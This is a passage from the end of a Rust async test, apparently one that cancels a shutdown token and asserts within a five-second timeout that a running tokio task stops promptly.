        );
        tokio::time::sleep(Duration::from_millis(25)).await;
    }

    shutdown.cancel();
    tokio::time::timeout(Duration::from_secs(5), running)
        .await
        .expect("stopped promptly")
        .unwrap();
}
